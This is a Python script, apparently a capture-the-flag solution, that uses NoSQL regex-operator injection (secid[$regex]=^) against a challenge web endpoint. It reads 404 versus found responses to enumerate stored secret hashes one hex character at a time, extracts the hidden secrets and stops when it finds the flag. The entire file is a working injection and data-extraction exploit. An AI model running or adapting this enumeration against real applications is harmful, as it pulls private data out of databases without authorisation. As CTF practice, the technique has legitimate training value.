#!/usr/bin/env
import requests as req
import time
import re
import queue
import hashlib

URL = "http://chal.cybersecurityrumble.de:37585/secret_share?secid[$regex]=^"

regex = r"-->(.*)<!--"


deadStarts = []

chars = "0123456789abcdef"


def parentHasMoreThanOneChildren(hash):
    l = len(hash) - 1
    if l < 0:
        return True

    url = URL + hash[:l] + '[^' + hash[l] + ']'
    
    r = req.get( url )
    if r.status_code == 404:
        return False

    return True

def hasChild(hash):
    url = URL + hash

    r = req.get( url )
    if r.status_code == 404:
        return False

    return True


def getSecret(hash):
    url = URL + hash

    r = req.get( url )
    return re.search(regex, r.text)[1]


def visitChild(hash):
    print(hash, end=' ')
    if not parentHasMoreThanOneChildren(hash):
        secret = getSecret(hash)
        print( secret )
        if "csr" in secret.lower():
            exit()
        return

    print('')
    for c in chars:
        if hasChild( hash + c ):
            visitChild( hash +c )


visitChild( '6' )
